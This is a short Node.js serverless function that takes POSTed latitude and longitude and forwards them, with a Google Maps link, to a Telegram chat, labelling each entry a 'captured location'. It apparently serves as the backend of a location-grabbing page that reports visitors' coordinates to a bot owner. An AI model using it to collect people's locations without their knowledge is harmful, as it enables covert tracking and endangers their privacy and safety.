const fetch = require('node-fetch');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.status(405).send('Method Not Allowed');
    return;
  }
  try {
    const { lat, lon } = req.body;
    if (!lat || !lon) {
      res.status(400).send('Missing lat/lon');
      return;
    }
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;
    if (!botToken || !chatId) {
      res.status(500).send('Server not configured (BOT_TOKEN/CHAT_ID missing)');
      return;
    }
    const text = `📍 Nova localização capturada:\n\nLatitude: ${lat}\nLongitude: ${lon}\n\nhttps://www.google.com/maps?q=${lat},${lon}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const r = await fetch(url, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
    });
    if (!r.ok) {
      const t = await r.text();
      res.status(502).send('Telegram API error: ' + t);
      return;
    }
    res.status(200).send('ok');
  } catch (e) {
    res.status(500).send('Server error');
  }
};
